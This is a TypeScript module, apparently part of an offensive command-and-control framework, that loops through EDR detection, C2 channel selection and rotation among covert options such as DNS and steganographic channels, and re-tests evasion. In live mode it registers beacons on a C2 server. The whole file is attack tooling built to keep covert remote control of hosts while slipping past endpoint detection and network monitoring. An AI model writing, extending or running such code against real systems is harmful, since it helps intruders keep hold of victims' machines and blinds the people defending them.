/**
 * @module edr_feedback_loop
 * Closed-loop EDR detection → C2 channel rotation → re-test evasion.
 */
import { auditDefenses } from "./counter_intel.ts"
import { selectC2Channel, applyChannelRotation, type C2ChannelOption } from "./c2_rotation.ts"
import { LegitC2Server, InMemoryTransport } from "./c2_platform.ts"
import { resolveLiveMode } from "./exec_options.ts"

export interface EdrFeedbackResult {
  iterations: Array<{
    edrDetected: string[]
    selectedChannel: string
    reason: string
    evasionScore: number
  }>
  finalChannel: string
  edrPresent: boolean
  summary: string
}

export async function runEdrFeedbackLoop(opts: {
  live?: boolean
  maxIterations?: number
  beaconId?: string
} = {}): Promise<EdrFeedbackResult> {
  const live = resolveLiveMode(opts)
  const max = opts.maxIterations ?? 3
  const iterations: EdrFeedbackResult["iterations"] = []
  let previous: string | undefined
  let finalChannel = "in-memory"

  const baseChannels: C2ChannelOption[] = [
    { name: "in-memory", transport: new InMemoryTransport(), priority: 5, edrRisk: "low" },
    { name: "dns-covert", transport: new InMemoryTransport(), priority: 8, edrRisk: "low" },
    { name: "http-webhook", transport: new InMemoryTransport(), priority: 6, edrRisk: "high" },
    { name: "stego-c2", transport: new InMemoryTransport(), priority: 7, edrRisk: "low" },
  ]

  for (let i = 0; i < max; i++) {
    const intel = auditDefenses({ live, check: "all" })
    const decision = await selectC2Channel(baseChannels, { live, previousChannel: previous })
    const edrCount = intel.edrDetected?.length ?? 0
    const evasionScore = Math.max(0, 10 - edrCount * 2 - (intel.networkMonitoring?.length ?? 0))

    iterations.push({
      edrDetected: intel.edrDetected ?? [],
      selectedChannel: decision.selectedChannel,
      reason: decision.reason,
      evasionScore,
    })

    if (live) {
      const server = new LegitC2Server({ checkpointPath: ".ourmine/c2/edr_feedback.jsonl" })
      const beaconId = opts.beaconId ?? `edr-loop-${i}`
      if (!server.sessions.has(beaconId)) {
        server.registerBeacon(beaconId, new InMemoryTransport(), { host: "local", user: "tier1" })
      }
      await applyChannelRotation(server, beaconId, baseChannels, { live: true })
    }

    previous = decision.selectedChannel
    finalChannel = decision.selectedChannel

    if (edrCount === 0 && (intel.networkMonitoring?.length ?? 0) === 0) break
  }

  const last = iterations[iterations.length - 1]
  return {
    iterations,
    finalChannel,
    edrPresent: (last?.edrDetected.length ?? 0) > 0,
    summary: live
      ? `EDR feedback loop: ${iterations.length} iteration(s), final channel '${finalChannel}'`
      : `EDR feedback loop planned (${iterations.length} iterations) — live execution required`,
  }
}

export default { runEdrFeedbackLoop }
